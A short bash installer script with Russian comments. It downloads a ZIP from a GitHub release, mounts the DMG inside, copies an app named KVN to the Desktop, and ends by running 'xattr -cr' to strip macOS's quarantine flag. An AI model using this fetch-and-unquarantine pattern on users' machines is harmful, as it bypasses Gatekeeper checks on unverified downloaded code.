#!/bin/bash

# Константы
readonly APP_URL="https://github.com/shepherl/kvnfaq/releases/download/1.0/macOS-Intel-App.zip"
readonly TMP_ZIP="/tmp/KVN_App.zip"

# Скачивание и распаковка ZIP
curl -L "$APP_URL" -o "$TMP_ZIP"

# Распаковываем ZIP во временную папку, чтобы найти там DMG
unzip -qo "$TMP_ZIP" -d /tmp/ 

# Ищем DMG файл (даже если имя чуть отличается)
DMG_PATH=$(find /tmp -maxdepth 1 -name "*.dmg" | head -n 1) 

# Монтируем DMG и получаем путь, куда он примонтировался
MOUNT_POINT=$(hdiutil attach -nobrowse -noautoopen "$DMG_PATH" | grep -o '/Volumes/.*' | head -n 1) 

# Копируем .app из DMG на Desktop
cp -R "$MOUNT_POINT"/*.app ~/Desktop/

#Размонтирование DMG
hdiutil detach "$MOUNT_POINT" -quiet

# Очистка временных файлов
rm "$TMP_ZIP" "$DMG_PATH"

# Вывод KVN с карантина 
xattr -cr ~/Desktop/KVN.app








